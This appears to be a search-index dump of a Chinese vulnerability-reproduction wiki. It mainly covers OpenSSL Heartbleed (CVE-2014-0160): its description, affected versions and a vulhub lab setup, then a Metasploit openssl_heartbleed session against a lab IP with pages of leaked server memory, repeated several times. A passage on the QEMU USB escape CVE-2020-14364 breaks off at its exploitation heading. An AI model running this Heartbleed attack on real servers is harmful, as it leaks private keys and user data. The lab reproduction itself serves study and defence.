Beta1\u7248\u672c\u4e2d\u5b58\u5728\u6f0f\u6d1e\uff0c\u8be5\u6f0f\u6d1e\u4e2d\u6587\u540d\u79f0\u4e3a\u5fc3\u810f\u6ef4\u8840\uff0c\u82f1\u6587\u540d\u79f0\u4e3aHeartBleed\u3002\u5176\u4e2dHeart\u662f\u6307\u8be5\u6f0f\u6d1e\u4f4d\u4e8e\u5fc3\u8df3\u534f\u8bae\u4e0a\uff0cBleed\u662f\u56e0\u4e3a\u8be5\u6f0f\u6d1e\u4f1a\u9020\u6210\u6570\u636e\u6cc4\u9732\u3002\u5373HeartBleed\u662f\u5728\u5fc3\u8df3\u534f\u8bae\u4e0a\u7684\u4e00\u4e2a\u6570\u636e\u6cc4\u9732\u6f0f\u6d1e\uff0cOpenSSL\u5e93\u4e2d\u7528\u5230\u4e86\u8be5\u5fc3\u8df3\u534f\u8bae\u3002HeartBleed\u4e3b\u8981\u5b58\u5728\u4e0eOpenSSL\u76841.0.1\u7248\u672c\u52301.0.1f\u7248\u672c\u3002 \u5f71\u54cd\u7248\u672c \u00b6 [!NOTE] OpenSSL1.0.1\u30011.0.1a\u30011.0.1b\u30011.0.1c\u30011.0.1d\u30011.0.1e\u30011.0.1f\u3001Beta 1 of OpenSSL 1.0.2\u7b49\u7248\u672c \u73af\u5883\u642d\u5efa \u00b6 https://github.com/vulhub/vulhub.git cd vulhub/openssl/heartbleed docker-compose up -d \u6f0f\u6d1e\u590d\u73b0 \u00b6 \u4f7f\u7528Nmap\u68c0\u6d4b\u811a\u672c\u5bf9\u76ee\u6807\u8fdb\u884c\u68c0\u6d4b \u68c0\u6d4b\u5230\u5fc3\u810f\u6ef4\u8840\u6f0f\u6d1e\uff0c\u4f7f\u7528MSF\u5bf9\u76ee\u6807\u8fdb\u884c\u653b\u51fb msf5 > use auxiliary/scanner/ssl/openssl_heartbleed msf5 auxiliary ( scanner/ssl/openssl_heartbleed ) > show options Module options ( auxiliary/scanner/ssl/openssl_heartbleed ) : Name Current Setting Required Description ---- --------------- -------- ----------- DUMPFILTER no Pattern to filter leaked memory before storing LEAK_COUNT 1 yes Number of times to leak memory per SCAN or DUMP invocation MAX_KEYTRIES 50 yes Max tries to dump key RESPONSE_TIMEOUT 10 yes Number of seconds to wait for a server response RHOSTS yes The target host ( s ) , range CIDR identifier, or hosts file with syntax 'file:<path>' RPORT 443 yes The target port ( TCP ) STATUS_EVERY 5 yes How many retries until key dump status THREADS 1 yes The number of concurrent threads ( max one per host ) TLS_CALLBACK None yes Protocol to use, \"None\" to use raw TLS sockets ( Accepted: None, SMTP, IMAP, JABBER, POP3, FTP, POSTGRES ) TLS_VERSION 1 .0 yes TLS/SSL version to use ( Accepted: SSLv3, 1 .0, 1 .1, 1 .2 ) Auxiliary action: Name Description ---- ----------- SCAN Check hosts for vulnerability msf5 auxiliary ( scanner/ssl/openssl_heartbleed ) > set rhost 192 .168.51.133 rhost = > 192 .168.51.133 msf5 auxiliary ( scanner/ssl/openssl_heartbleed ) > set verbose true verbose = > true msf5 auxiliary ( scanner/ssl/openssl_heartbleed ) > run [ * ] 192 .168.51.133:443 - Leaking heartbeat response #1 [ * ] 192 .168.51.133:443 - Sending Client Hello... [ * ] 192 .168.51.133:443 - SSL record #1: [ * ] 192 .168.51.133:443 - Type: 22 [ * ] 192 .168.51.133:443 - Version: 0x0301 [ * ] 192 .168.51.133:443 - Length: 86 [ * ] 192 .168.51.133:443 - Handshake #1: [ * ] 192 .168.51.133:443 - Length: 82 [ * ] 192 .168.51.133:443 - Type: Server Hello ( 2 ) [ * ] 192 .168.51.133:443 - Server Hello Version: 0x0301 [ * ] 192 .168.51.133:443 - Server Hello random data: 5fd46996727a4e50c0e2eaecf52d1592384aaa6870d4d65eea8b6b34eb47a389 [ * ] 192 .168.51.133:443 - Server Hello Session ID length: 32 [ * ] 192 .168.51.133:443 - Server Hello Session ID: 66e9cacbefcb28955de31c38bd9dff93de153a6d6247fa117ebc3f2f091d6f74 [ * ] 192 .168.51.133:443 - SSL record #2: [ * ] 192 .168.51.133:443 - Type: 22 [ * ] 192 .168.51.133:443 - Version: 0x0301 [ * ] 192 .168.51.133:443 - Length: 822 [ * ] 192 .168.51.133:443 - Handshake #1: [ * ] 192 .168.51.133:443 - Length: 818 [ * ] 192 .168.51.133:443 - Type: Certificate Data ( 11 ) [ * ] 192 .168.51.133:443 - Certificates length: 815 [ * ] 192 .168.51.133:443 - Data length: 818 [ * ] 192 .168.51.133:443 - Certificate #1: [ * ] 192 .168.51.133:443 - Certificate #1: Length: 812 [ * ] 192 .168.51.133:443 - Certificate #1: #<OpenSSL::X509::Certificate: subject=#<OpenSSL::X509::Name CN=localhost,O=Dis,L=Springfield,ST=Denial,C=US>, issuer=#<OpenSSL::X509::Name CN=localhost,O=Dis,L=Springfield,ST=Denial,C=US>, serial=#<OpenSSL::BN:0x00007efe8154c028>, not_before=2020-08-09 17:03:46 UTC, not_after=2021-08-09 17:03:46 UTC> [ * ] 192 .168.51.133:443 - SSL record #3: [ * ] 192 .168.51.133:443 - Type: 22 [ * ] 192 .168.51.133:443 - Version: 0x0301 [ * ] 192 .168.51.133:443 - Length: 331 [ * ] 192 .168.51.133:443 - Handshake #1: [ * ] 192 .168.51.133:443 - Length: 327 [ * ] 192 .168.51.133:443 - Type: Server Key Exchange ( 12 ) [ * ] 192 .168.51.133:443 - SSL record #4: [ * ] 192 .168.51.133:443 - Type: 22 [ * ] 192 .168.51.133:443 - Version: 0x0301 [ * ] 192 .168.51.133:443 - Length: 4 [ * ] 192 .168.51.133:443 - Handshake #1: [ * ] 192 .168.51.133:443 - Length: 0 [ * ] 192 .168.51.133:443 - Type: Server Hello Done ( 14 ) [ * ] 192 .168.51.133:443 - Sending Heartbeat... [ * ] 192 .168.51.133:443 - Heartbeat response, 65535 bytes [ + ] 192 .168.51.133:443 - Heartbeat response with leak, 65535 bytes [ * ] 192 .168.51.133:443 - Printable info leaked: ......_...DV. \\. ...G... { .vc..i ..Gv. '....f.....\".!.9.8.........5.............................3.2.....E.D...../...A.......................................w.....#.' .g.@.r.v.........8.........2.....E.D.......Q.......P. = ...<.......A...............................#.............*. ( .........................................+........-.....3. & .$... 3 .<. ] ...et1......L.D.L%*.V8.... { ............................................................................................................................................jectReference \" type=\" ServiceInstance \">ServiceInstance</_this></RetrieveServiceContent></soap:Body></soap:Envelope>W&V.b...?....|.y..................................................................................................................................... repeated 15479 times .....................................................................................................................................@..................................................................................................................................... repeated 16122 times .....................................................................................................................................@.................................................................................................................................................................................................................................................................................................................................QA......h.......h.........7.RV....7.RV..................................................................................................................................... repeated 4129 times .....................................................................................................................................0......X.......X.........................7.RV..............................RV..=.c.RV.. .7.RV..x.7.RV....7.RV....7.RV..x.7.RV..x.7.RV..h.7.RV....7.RV....7.RV..192.168.51.146 - - [12/Dec/2020:06:47:40 +0000] \" POST /sdk HTTP/1.1 \" 404 170 \" - \" \" Mozilla/5.0 ( compatible ; Nmap Scripting Engine ; https://nmap.org/book/nse.html ) \".org/book/nse.html)\" ..................................................................................................................................... repeated 3184 times .....................................................................................................................................Q ........................7.RV....7.RV..................................................................................................................................... repeated 7539 times .....................................................................................................................................@..........................................................................................................................................................................................................................................................................................................................................@....................................................................................................................................................................................................... $4 .RV..................................@....... .......0.8.RV.......... ` .......0........ $4 .RV..jfx... & ...~.RV..........PA...... ` ....... '..RV..@d4.RV....................2.RV....................2.RV..........................1.................8.RV..........................1...............................................!...............h....... ...............m..U`.W.....O.>c.....E^X4........kr[..:.1...z[..x.W].........f...3h.qS.&K.(A*q*...].tx.b....X........Np....l.F...5....~..Z2.D..$........................................................................................................................................1.......x.......x.......P.2.RV....2.RV..0.......0.......>#NQ[.8.].......&.i2y.x.I....iOk........a....... ' ..RV.. ` .2.RV..................0.2.RV....................2.RV...................... ; P.e.........................U.6. & ` .Ks..w>V.. ^..N..z....z...M.+..n/i..C...D......a..2.p..<..... } k.W:.Eq....Ui*I.X...m...-..x..3 } .5NM............... .......P.2.RV..................1.........t.............................0....................V..>...I5.F......!.3Xhy.4.....r.....h.d..b........ ) .......3..... & ......IE...c,8.T.~..H.P. { y.....CK.,! & .. ; ..vw....H.C...q....%e.. { .XT.jq.R.r.....RHw..57.COlB.. | ......@...*.G ( 3 ..-N..P....mLO.. ] ./.,9.. | ..+2.Lh..q..dF.m... '.....`...S.8........Q...U.0....I................................................................................................................................................................................................................................................................................ ' ..RV.. .8.RV.. ` .2.RV....................8.RV.................................. .2.RV....................2.RV............................................2.RV....................2.RV.......................... .2.RV.. .2.RV..................h.......h.........8.RV....8.RV..................................................................................................................................... repeated 745 times .....................................................................................................................................#8.RV.. ` .2.RV........!.3Xhy.4.....r.....h.d..b........ ) .......3..... & ......IE...c,8.T.~..H.P. { y.....CK.,! & .. ; ..vw....H.C...q....%e.. { .XT.jq.R.r.....RHw..57.COlB.. | ......@...*.G ( 3 ..-N..P....mLO.. ] ./.,9.. | ..+2.Lh..q..dF.m... '.....`...S.8........Q...U.0....I ..................................................................................................................................... repeated 277 times .....................................................................................................................................X.......`.2.RV..........................................................P...........RV............................................................................................................................................................................................................................................................................................................................................2.RV..X..................................................................................................................................... repeated 437 times .....................................................................................................................................A.......X.........1.RV..................................................................................................................................................................................................................................................................................................................................X.......X..................................................................................................................................... repeated 429 times .....................................................................................................................................x.......!.......X.......X..................................................................................................................................... repeated 1942 times .....................................................................................................................................@..........V...R.._.i.rzNP.....-..8J.hp..^..k4.G.. f.....(.]..8......:mbG..~.?/..ot...................6...2../..,0..(0...........j..0...*.H........0V1.0...U....US1.0...U....Denial1.0...U....Springfield1.0...U....Dis1.0...U....localhost0...200809170346Z..210809170346Z0V1.0...U....US1.0...U....Denial1.0...U....Springfield1.0...U....Dis1.0...U....localhost0..\"0...*.H.............0.........8...;....../t.....^.....P..=....w.*b.a>.8.Q.?.$.c.......{G. ........l..i...D..V....0......B..J..Y.c.wO.....M.Df..R....\".4.u...............P.><7d}VK4^.$.S..U..u..R7l.+.H....;.V\\.w.?..).........[....M..3......?..e...WBI^..&.' .nhV!.......V. ; ...y..+ & tm.c1..3-.....0...*.H..............>.c.. | .s ( ......,..H.1..0. = l ` ... ( 2 ..Sb....... ` ...c....5J....v..uj.*^i. $6 ^..a3.s.......v... \\. ...M.pK.9....t. & ... | y...u1.......u..M..%.+.. { e....G..~.v.D.6............... =) .3 { ......r/. \"vz..a.U..5-.5.=......l..ud......Nx...n.. $h ...4.G.~b.LU.Y...37..e....%.w.......K...G...A....~m.h,......qz>}uA.^)..A.&}o@..'...y.]..V..S..JY........Y/.u|.... $ .n.T._.b\\\\c...o.]....L.h...v*....z..D..?Kq9hJ.kT....?.....=......su....p.S...j.e.....-N}.S...x..Z.....t.;Z...n=.1.......J.1n.l...w. .l.d.W. .........8..`.>O........t...r..~.A $ ..R...v.8......x.\\o<.....#hS......Vz.6....V..l....-.....,n...p.(..L.w.7h3...3..................................................................................................................................... repeated 6250 times ..................................................................................................................................... [*] 192.168.51.133:443 - Scanned 1 of 1 hosts (100% complete) [*] Auxiliary module execution completed","title":"OpenSSL \u5fc3\u810f\u6ef4\u8840\u6f0f\u6d1e CVE-2014-0160"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/OpenSSL/OpenSSL%20%E5%BF%83%E8%84%8F%E6%BB%B4%E8%A1%80%E6%BC%8F%E6%B4%9E%20CVE-2014-0160/#openssl-\u5fc3\u810f\u6ef4\u8840\u6f0f\u6d1e-cve-2014-0160","text":"","title":"OpenSSL \u5fc3\u810f\u6ef4\u8840\u6f0f\u6d1e CVE-2014-0160"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/OpenSSL/OpenSSL%20%E5%BF%83%E8%84%8F%E6%BB%B4%E8%A1%80%E6%BC%8F%E6%B4%9E%20CVE-2014-0160/#\u6f0f\u6d1e\u63cf\u8ff0","text":"2014\u5e744\u67087\u65e5\uff0cOpenSSL\u53d1\u5e03\u5b89\u5168\u516c\u544a\uff0c\u5728OpenSSL1.0.1\u7248\u672c\u81f3OpenSSL1.0.1f Beta1\u7248\u672c\u4e2d\u5b58\u5728\u6f0f\u6d1e\uff0c\u8be5\u6f0f\u6d1e\u4e2d\u6587\u540d\u79f0\u4e3a\u5fc3\u810f\u6ef4\u8840\uff0c\u82f1\u6587\u540d\u79f0\u4e3aHeartBleed\u3002\u5176\u4e2dHeart\u662f\u6307\u8be5\u6f0f\u6d1e\u4f4d\u4e8e\u5fc3\u8df3\u534f\u8bae\u4e0a\uff0cBleed\u662f\u56e0\u4e3a\u8be5\u6f0f\u6d1e\u4f1a\u9020\u6210\u6570\u636e\u6cc4\u9732\u3002\u5373HeartBleed\u662f\u5728\u5fc3\u8df3\u534f\u8bae\u4e0a\u7684\u4e00\u4e2a\u6570\u636e\u6cc4\u9732\u6f0f\u6d1e\uff0cOpenSSL\u5e93\u4e2d\u7528\u5230\u4e86\u8be5\u5fc3\u8df3\u534f\u8bae\u3002HeartBleed\u4e3b\u8981\u5b58\u5728\u4e0eOpenSSL\u76841.0.1\u7248\u672c\u52301.0.1f\u7248\u672c\u3002","title":"\u6f0f\u6d1e\u63cf\u8ff0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/OpenSSL/OpenSSL%20%E5%BF%83%E8%84%8F%E6%BB%B4%E8%A1%80%E6%BC%8F%E6%B4%9E%20CVE-2014-0160/#\u5f71\u54cd\u7248\u672c","text":"[!NOTE] OpenSSL1.0.1\u30011.0.1a\u30011.0.1b\u30011.0.1c\u30011.0.1d\u30011.0.1e\u30011.0.1f\u3001Beta 1 of OpenSSL 1.0.2\u7b49\u7248\u672c","title":"\u5f71\u54cd\u7248\u672c"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/OpenSSL/OpenSSL%20%E5%BF%83%E8%84%8F%E6%BB%B4%E8%A1%80%E6%BC%8F%E6%B4%9E%20CVE-2014-0160/#\u73af\u5883\u642d\u5efa","text":"https://github.com/vulhub/vulhub.git cd vulhub/openssl/heartbleed docker-compose up -d","title":"\u73af\u5883\u642d\u5efa"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/OpenSSL/OpenSSL%20%E5%BF%83%E8%84%8F%E6%BB%B4%E8%A1%80%E6%BC%8F%E6%B4%9E%20CVE-2014-0160/#\u6f0f\u6d1e\u590d\u73b0","text":"\u4f7f\u7528Nmap\u68c0\u6d4b\u811a\u672c\u5bf9\u76ee\u6807\u8fdb\u884c\u68c0\u6d4b \u68c0\u6d4b\u5230\u5fc3\u810f\u6ef4\u8840\u6f0f\u6d1e\uff0c\u4f7f\u7528MSF\u5bf9\u76ee\u6807\u8fdb\u884c\u653b\u51fb msf5 > use auxiliary/scanner/ssl/openssl_heartbleed msf5 auxiliary ( scanner/ssl/openssl_heartbleed ) > show options Module options ( auxiliary/scanner/ssl/openssl_heartbleed ) : Name Current Setting Required Description ---- --------------- -------- ----------- DUMPFILTER no Pattern to filter leaked memory before storing LEAK_COUNT 1 yes Number of times to leak memory per SCAN or DUMP invocation MAX_KEYTRIES 50 yes Max tries to dump key RESPONSE_TIMEOUT 10 yes Number of seconds to wait for a server response RHOSTS yes The target host ( s ) , range CIDR identifier, or hosts file with syntax 'file:<path>' RPORT 443 yes The target port ( TCP ) STATUS_EVERY 5 yes How many retries until key dump status THREADS 1 yes The number of concurrent threads ( max one per host ) TLS_CALLBACK None yes Protocol to use, \"None\" to use raw TLS sockets ( Accepted: None, SMTP, IMAP, JABBER, POP3, FTP, POSTGRES ) TLS_VERSION 1 .0 yes TLS/SSL version to use ( Accepted: SSLv3, 1 .0, 1 .1, 1 .2 ) Auxiliary action: Name Description ---- ----------- SCAN Check hosts for vulnerability msf5 auxiliary ( scanner/ssl/openssl_heartbleed ) > set rhost 192 .168.51.133 rhost = > 192 .168.51.133 msf5 auxiliary ( scanner/ssl/openssl_heartbleed ) > set verbose true verbose = > true msf5 auxiliary ( scanner/ssl/openssl_heartbleed ) > run [ * ] 192 .168.51.133:443 - Leaking heartbeat response #1 [ * ] 192 .168.51.133:443 - Sending Client Hello... [ * ] 192 .168.51.133:443 - SSL record #1: [ * ] 192 .168.51.133:443 - Type: 22 [ * ] 192 .168.51.133:443 - Version: 0x0301 [ * ] 192 .168.51.133:443 - Length: 86 [ * ] 192 .168.51.133:443 - Handshake #1: [ * ] 192 .168.51.133:443 - Length: 82 [ * ] 192 .168.51.133:443 - Type: Server Hello ( 2 ) [ * ] 192 .168.51.133:443 - Server Hello Version: 0x0301 [ * ] 192 .168.51.133:443 - Server Hello random data: 5fd46996727a4e50c0e2eaecf52d1592384aaa6870d4d65eea8b6b34eb47a389 [ * ] 192 .168.51.133:443 - Server Hello Session ID length: 32 [ * ] 192 .168.51.133:443 - Server Hello Session ID: 66e9cacbefcb28955de31c38bd9dff93de153a6d6247fa117ebc3f2f091d6f74 [ * ] 192 .168.51.133:443 - SSL record #2: [ * ] 192 .168.51.133:443 - Type: 22 [ * ] 192 .168.51.133:443 - Version: 0x0301 [ * ] 192 .168.51.133:443 - Length: 822 [ * ] 192 .168.51.133:443 - Handshake #1: [ * ] 192 .168.51.133:443 - Length: 818 [ * ] 192 .168.51.133:443 - Type: Certificate Data ( 11 ) [ * ] 192 .168.51.133:443 - Certificates length: 815 [ * ] 192 .168.51.133:443 - Data length: 818 [ * ] 192 .168.51.133:443 - Certificate #1: [ * ] 192 .168.51.133:443 - Certificate #1: Length: 812 [ * ] 192 .168.51.133:443 - Certificate #1: #<OpenSSL::X509::Certificate: subject=#<OpenSSL::X509::Name CN=localhost,O=Dis,L=Springfield,ST=Denial,C=US>, issuer=#<OpenSSL::X509::Name CN=localhost,O=Dis,L=Springfield,ST=Denial,C=US>, serial=#<OpenSSL::BN:0x00007efe8154c028>, not_before=2020-08-09 17:03:46 UTC, not_after=2021-08-09 17:03:46 UTC> [ * ] 192 .168.51.133:443 - SSL record #3: [ * ] 192 .168.51.133:443 - Type: 22 [ * ] 192 .168.51.133:443 - Version: 0x0301 [ * ] 192 .168.51.133:443 - Length: 331 [ * ] 192 .168.51.133:443 - Handshake #1: [ * ] 192 .168.51.133:443 - Length: 327 [ * ] 192 .168.51.133:443 - Type: Server Key Exchange ( 12 ) [ * ] 192 .168.51.133:443 - SSL record #4: [ * ] 192 .168.51.133:443 - Type: 22 [ * ] 192 .168.51.133:443 - Version: 0x0301 [ * ] 192 .168.51.133:443 - Length: 4 [ * ] 192 .168.51.133:443 - Handshake #1: [ * ] 192 .168.51.133:443 - Length: 0 [ * ] 192 .168.51.133:443 - Type: Server Hello Done ( 14 ) [ * ] 192 .168.51.133:443 - Sending Heartbeat... [ * ] 192 .168.51.133:443 - Heartbeat response, 65535 bytes [ + ] 192 .168.51.133:443 - Heartbeat response with leak, 65535 bytes [ * ] 192 .168.51.133:443 - Printable info leaked: ......_...DV. \\. ...G... { .vc..i ..Gv. '....f.....\".!.9.8.........5.............................3.2.....E.D...../...A.......................................w.....#.' .g.@.r.v.........8.........2.....E.D.......Q.......P. = ...<.......A...............................#.............*. ( .........................................+........-.....3. & .$... 3 .<. ] ...et1......L.D.L%*.V8.... { ............................................................................................................................................jectReference \" type=\" ServiceInstance \">ServiceInstance</_this></RetrieveServiceContent></soap:Body></soap:Envelope>W&V.b...?....|.y..................................................................................................................................... repeated 15479 times .....................................................................................................................................@..................................................................................................................................... repeated 16122 times .....................................................................................................................................@.................................................................................................................................................................................................................................................................................................................................QA......h.......h.........7.RV....7.RV..................................................................................................................................... repeated 4129 times .....................................................................................................................................0......X.......X.........................7.RV..............................RV..=.c.RV.. .7.RV..x.7.RV....7.RV....7.RV..x.7.RV..x.7.RV..h.7.RV....7.RV....7.RV..192.168.51.146 - - [12/Dec/2020:06:47:40 +0000] \" POST /sdk HTTP/1.1 \" 404 170 \" - \" \" Mozilla/5.0 ( compatible ; Nmap Scripting Engine ; https://nmap.org/book/nse.html ) \".org/book/nse.html)\" ..................................................................................................................................... repeated 3184 times .....................................................................................................................................Q ........................7.RV....7.RV..................................................................................................................................... repeated 7539 times .....................................................................................................................................@..........................................................................................................................................................................................................................................................................................................................................@....................................................................................................................................................................................................... $4 .RV..................................@....... .......0.8.RV.......... ` .......0........ $4 .RV..jfx... & ...~.RV..........PA...... ` ....... '..RV..@d4.RV....................2.RV....................2.RV..........................1.................8.RV..........................1...............................................!...............h....... ...............m..U`.W.....O.>c.....E^X4........kr[..:.1...z[..x.W].........f...3h.qS.&K.(A*q*...].tx.b....X........Np....l.F...5....~..Z2.D..$........................................................................................................................................1.......x.......x.......P.2.RV....2.RV..0.......0.......>#NQ[.8.].......&.i2y.x.I....iOk........a....... ' ..RV.. ` .2.RV..................0.2.RV....................2.RV...................... ; P.e.........................U.6. & ` .Ks..w>V.. ^..N..z....z...M.+..n/i..C...D......a..2.p..<..... } k.W:.Eq....Ui*I.X...m...-..x..3 } .5NM............... .......P.2.RV..................1.........t.............................0....................V..>...I5.F......!.3Xhy.4.....r.....h.d..b........ ) .......3..... & ......IE...c,8.T.~..H.P. { y.....CK.,! & .. ; ..vw....H.C...q....%e.. { .XT.jq.R.r.....RHw..57.COlB.. | ......@...*.G ( 3 ..-N..P....mLO.. ] ./.,9.. | ..+2.Lh..q..dF.m... '.....`...S.8........Q...U.0....I................................................................................................................................................................................................................................................................................ ' ..RV.. .8.RV.. ` .2.RV....................8.RV.................................. .2.RV....................2.RV............................................2.RV....................2.RV.......................... .2.RV.. .2.RV..................h.......h.........8.RV....8.RV..................................................................................................................................... repeated 745 times .....................................................................................................................................#8.RV.. ` .2.RV........!.3Xhy.4.....r.....h.d..b........ ) .......3..... & ......IE...c,8.T.~..H.P. { y.....CK.,! & .. ; ..vw....H.C...q....%e.. { .XT.jq.R.r.....RHw..57.COlB.. | ......@...*.G ( 3 ..-N..P....mLO.. ] ./.,9.. | ..+2.Lh..q..dF.m... '.....`...S.8........Q...U.0....I ..................................................................................................................................... repeated 277 times .....................................................................................................................................X.......`.2.RV..........................................................P...........RV............................................................................................................................................................................................................................................................................................................................................2.RV..X..................................................................................................................................... repeated 437 times .....................................................................................................................................A.......X.........1.RV..................................................................................................................................................................................................................................................................................................................................X.......X..................................................................................................................................... repeated 429 times .....................................................................................................................................x.......!.......X.......X..................................................................................................................................... repeated 1942 times .....................................................................................................................................@..........V...R.._.i.rzNP.....-..8J.hp..^..k4.G.. f.....(.]..8......:mbG..~.?/..ot...................6...2../..,0..(0...........j..0...*.H........0V1.0...U....US1.0...U....Denial1.0...U....Springfield1.0...U....Dis1.0...U....localhost0...200809170346Z..210809170346Z0V1.0...U....US1.0...U....Denial1.0...U....Springfield1.0...U....Dis1.0...U....localhost0..\"0...*.H.............0.........8...;....../t.....^.....P..=....w.*b.a>.8.Q.?.$.c.......{G. ........l..i...D..V....0......B..J..Y.c.wO.....M.Df..R....\".4.u...............P.><7d}VK4^.$.S..U..u..R7l.+.H....;.V\\.w.?..).........[....M..3......?..e...WBI^..&.' .nhV!.......V. ; ...y..+ & tm.c1..3-.....0...*.H..............>.c.. | .s ( ......,..H.1..0. = l ` ... ( 2 ..Sb....... ` ...c....5J....v..uj.*^i. $6 ^..a3.s.......v... \\. ...M.pK.9....t. & ... | y...u1.......u..M..%.+.. { e....G..~.v.D.6............... =) .3 { ......r/. \"vz..a.U..5-.5.=......l..ud......Nx...n.. $h ...4.G.~b.LU.Y...37..e....%.w.......K...G...A....~m.h,......qz>}uA.^)..A.&}o@..'...y.]..V..S..JY........Y/.u|.... $ .n.T._.b\\\\c...o.]....L.h...v*....z..D..?Kq9hJ.kT....?.....=......su....p.S...j.e.....-N}.S...x..Z.....t.;Z...n=.1.......J.1n.l...w. .l.d.W. .........8..`.>O........t...r..~.A $ ..R...v.8......x.\\o<.....#hS......Vz.6....V..l....-.....,n...p.(..L.w.7h3...3..................................................................................................................................... repeated 6250 times ..................................................................................................................................... [*] 192.168.51.133:443 - Scanned 1 of 1 hosts (100% complete) [*] Auxiliary module execution completed","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Qemu/QEMU%20%E8%99%9A%E6%8B%9F%E6%9C%BA%E9%80%83%E9%80%B8%E6%BC%8F%E6%B4%9E%20CVE-2020-14364/","text":"QEMU \u865a\u62df\u673a\u9003\u9038\u6f0f\u6d1e CVE-2020-14364 \u00b6 \u6f0f\u6d1e\u63cf\u8ff0 \u00b6 \u5f53\u5730\u65f6\u95f48\u670824\u65e5\uff0c\u4e00\u4e2a\u5b58\u5728\u4e8eQEMU USB\u6a21\u62df\u5668\u4e2d\u7684\u8d8a\u754c\u8bfb\u5199\u6f0f\u6d1e\uff08CVE-2020-14364\uff09\u88ab\u516c\u5e03\u3002 \u6f0f\u6d1e\u4f4d\u4e8e ./hw/usb/core.c \u4e2d\uff0c\u5f53\u7a0b\u5e8f\u5904\u7406\u6765\u81ea\u5ba2\u6237\u673a\u7684USB\u6570\u636e\u5305\u65f6\uff0c\u5982\u679c\u5728 do_token_in \u4e0e do_token_out\u4e2d\u2019USBDevice->setup_len\u2019\u8d85\u8fc7\u4e86USBDevice->data_buf[4096]\uff0c\u5219\u5b58\u5728\u95ee\u9898\u3002 \u5ba2\u6237\u673a\u7528\u6237\u53ef\u80fd\u4f1a\u4f7f\u7528\u6b64\u6f0f\u6d1e\u4f7fQEMU\u8fdb\u7a0b\u5d29\u6e83\uff0c\u4ece\u800c\u5bfc\u81f4DoS\u6216\u5728\u5bbf\u4e3b\u673a\u4e0a\u4ee5QEMU\u8fdb\u7a0b\u7684\u7279\u6743\u6267\u884c\u4efb\u610f\u4ee3\u7801\uff0c\u5b9e\u73b0\u865a\u62df\u673a\u9003\u9038\u3002 \u653b\u51fb\u8005\u5728\u62e5\u6709\u4e91\u73af\u5883\u865a\u62df\u673a\u64cd\u4f5c\u7cfb\u7edf\u6743\u9650\u7684\u60c5\u51b5\u4e0b\uff0c\u4fbf\u53ef\u5229\u7528\u8be5\u6f0f\u6d1e\u83b7\u53d6\u5bbf\u4e3b\u673a\u6743\u9650\uff0c\u8fdb\u800c\u653b\u51fb\u865a\u62df\u673a\u6240\u5728\u8d44\u6e90\u6c60\u6240\u6709\u79df\u6237\u4e3b\u673a\uff0c\u751a\u81f3\u53ef\u901a\u8fc7\u5df2\u5f00\u901a\u7684\u5185\u7f51\u6743\u9650\u653b\u51fb\u7ba1\u7406\u57df\u7cfb\u7edf\uff0c\u98ce\u9669\u6781\u9ad8\u3002 \u672c\u6b21\u6f0f\u6d1e\u7684\u5f71\u54cd\u8303\u56f4\u8f83\u5e7f\uff0c\u6d89\u53caqemu 1.0 \u4ee5\u4e0a\u7684\u5168\u90e8\u7248\u672c\u3002 \u6f0f\u6d1e\u5f71\u54cd \u00b6 [!NOTE] Qemu > 1.0 \u6f0f\u6d1e\u590d\u73b0 \u00b6 \u6f0f\u6d1e\u539f\u7406 \u00b6 USB\u603b\u7ebf\u901a\u8fc7\u521b\u5efa\u4e00\u4e2aUSBpacket\u5bf9\u8c61\u6765\u548cUSB\u8bbe\u5907\u901a\u4fe1\u3002 Usbpacket\u5bf9\u8c61\u4e2d\u5305\u542b\u4ee5\u4e0b\u5173\u952e\u5185\u5bb9 \u5176\u4e2dpid\u8868\u660epacket\u7684\u7c7b\u578b\uff0c\u5b58\u5728\u4e09\u79cd\u7c7b\u578bin\u3001out\u3001setup, ep\u6307\u5411endpoint\u5bf9\u8c61\uff0c\u901a\u8fc7\u6b64\u7ed3\u6784\u5b9a\u4f4d\u76ee\u6807usb\u8bbe\u5907\u3002 \u6570\u636e\u4ea4\u6362\u4e3ausbdevice\u4e2d\u7f13\u51b2\u533a\u7684data_buf\u4e0eusbpacket\u5bf9\u8c61\u4e2d\u4f7f\u7528usb_packet_map\u7533\u8bf7\u7684\u7f13\u51b2\u533a\u4e24\u8005\u95f4\u901a\u8fc7usb_packet_copy\u51fd\u6570\u5b9e\u73b0,\u4e3a\u4e86\u9632\u6b62\u4e24\u8005\u7f13\u51b2\u533a\u957f\u5ea6\u4e0d\u5339\u914d\uff0c\u4f20\u9001\u7684\u957f\u5ea6\u7531s->setup_len\u9650\u5236\u3002 \u6f0f\u6d1e\u5b58\u5728\u4e8es->setup_len\u8d4b\u503c\u7684\u8fc7\u7a0bdo_token_setup\u4e2d\u3002 \u867d\u7136\u8fdb\u884c\u4e86\u6821\u9a8c\uff0c\u4f46\u662f\u7531\u4e8e\u5728\u6821\u9a8c\u524d\uff0cs->setup_len\u7684\u503c\u5df2\u7ecf\u88ab\u8bbe\u7f6e\u5bfc\u81f4\u4e4b\u540e\u7684do_token_in\u6216\u8005do_token_out\u4e2d\u4f7f\u7528usb_packet_copy\u65f6\u4f1a\u4ea7\u751f\u8d8a\u754c\u8bfb\u5199\u6f0f\u6d1e\u3002 \u5229\u7528\u65b9\u5f0f \u00b6 1. 